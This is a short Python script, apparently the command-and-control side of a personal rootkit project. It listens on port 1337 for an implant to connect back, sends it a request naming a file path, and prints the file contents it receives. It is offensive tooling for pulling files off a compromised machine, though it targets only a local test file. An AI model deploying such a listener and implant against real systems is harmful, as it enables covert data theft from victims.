#!/usr/bin/python

import socket
import struct

PORT = 1337
FILE_PATH = b'/home/ppeck/Desktop/Stuff/Cyber/Projects/rootkit/test\0'

req = struct.pack('<Q', len(FILE_PATH) + 9 + 2) + struct.pack('<B', 0)
req += struct.pack('<H', len(FILE_PATH)) + FILE_PATH

server_sock = socket.socket()
server_sock.bind(('', PORT))
server_sock.listen(1)
client_sock, client_address = server_sock.accept()

client_sock.send(req)

res_len = struct.unpack('<Q', client_sock.recv(8))[0]
print('Response length: ' + str(res_len))

client_sock.recv(1)

err = struct.unpack('<B', client_sock.recv(1))[0]
print('Response error code: ' + str(err))

data_len = struct.unpack('<Q', client_sock.recv(8))[0]
print('File size: ' + str(data_len))

file_path = FILE_PATH.decode()

if err == 0:
    print(file_path + ' was retrieved successfully!')
    data = client_sock.recv(data_len)
    print('File Data:')
    print(data)

server_sock.close()
client_sock.close()
